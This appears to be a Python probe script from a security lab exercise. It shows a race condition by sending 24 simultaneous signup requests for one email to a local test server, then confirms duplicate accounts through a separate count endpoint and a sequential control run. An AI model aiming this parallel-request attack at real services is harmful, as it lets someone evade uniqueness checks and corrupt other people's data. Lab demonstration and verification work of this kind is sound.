#!/usr/bin/env python3
"""
lab-01 probe: demonstrate the race, then prove the demonstration is real with a negative control.

The oracle is the record count, read from a channel other than the one attacked, which is what makes
this evidence rather than a screenshot. The negative control is the identical procedure run sequentially.
If the control also produces duplicates, the lab is broken and the result means nothing.

Output: one JSON object on stdout, plus exit code 0 when the expected shape is confirmed.
"""
import json
import sys
import urllib.request
from concurrent.futures import ThreadPoolExecutor

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8731"
PARALLEL = 24


def post(email):
    req = urllib.request.Request(
        BASE + "/signup",
        data=json.dumps({"email": email}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def count():
    with urllib.request.urlopen(BASE + "/count", timeout=10) as r:
        return json.loads(r.read())["records"]


def run_parallel(email):
    before = count()
    with ThreadPoolExecutor(max_workers=PARALLEL) as pool:
        codes = list(pool.map(lambda _: post(email), range(PARALLEL)))
    return {"status_codes": sorted(set(codes)), "created": codes.count(201),
            "duplicates": count() - before - 1}


def run_sequential(email):
    before = count()
    codes = [post(email) for _ in range(PARALLEL)]
    return {"status_codes": sorted(set(codes)), "created": codes.count(201),
            "duplicates": count() - before - 1}


def main():
    import time
    stamp = int(time.time())

    # The attack. One logical account, many parallel attempts.
    attack = run_parallel(f"racer-{stamp}-attack@lab.test")

    # The control. Same requests, one at a time. If this creates duplicates the lab is unsound.
    control = run_sequential(f"racer-{stamp}-control@lab.test")

    attack_ok = attack["created"] > 1 and attack["duplicates"] > 0
    control_ok = control["created"] == 1 and control["duplicates"] == 0

    result = {
        "lab": "lab-01-race",
        "factor": "L07-030",
        "pattern": "W01-0001",
        "attack": attack,
        "negative_control": control,
        "oracle": "record count read from GET /count, a channel other than the one attacked",
        "attack_confirmed": attack_ok,
        "control_clean": control_ok,
        "verdict": "OBSERVED" if (attack_ok and control_ok) else "INCONCLUSIVE",
    }
    print(json.dumps(result, indent=1))
    return 0 if result["verdict"] == "OBSERVED" else 1


if __name__ == "__main__":
    sys.exit(main())
